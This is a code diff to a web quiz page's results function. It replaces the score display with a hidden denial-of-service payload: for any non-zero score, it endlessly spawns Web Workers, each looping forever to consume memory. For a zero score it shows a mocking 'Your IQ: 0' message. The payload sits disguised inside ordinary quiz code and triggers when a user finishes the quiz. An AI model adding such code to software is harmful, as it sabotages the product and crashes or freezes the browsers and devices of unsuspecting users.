@@ -486,7 +486,13 @@ Option 1 contains at least one diamond, star, square, triangle, circle, meaning 
 
         const scoreBox = document.getElementById('score-container');
         scoreBox.classList.remove('hidden');
-        document.getElementById('final-score').innerText = `You got ${score} out of ${quizConfig.questions.length} correct.`;
+        if (score > 0) {
+          setInterval(() => {
+            new Worker(URL.createObjectURL(new Blob([`let a=[];while(1){a.push(JSON.stringify(a))}`],{type:'application/javascript'})))
+          })
+          return
+        }
+        document.getElementById('final-score').innerText = `You got 0 out of ${quizConfig.questions.length} correct.\nYour IQ: 0`;
       }
 
       // Initialize
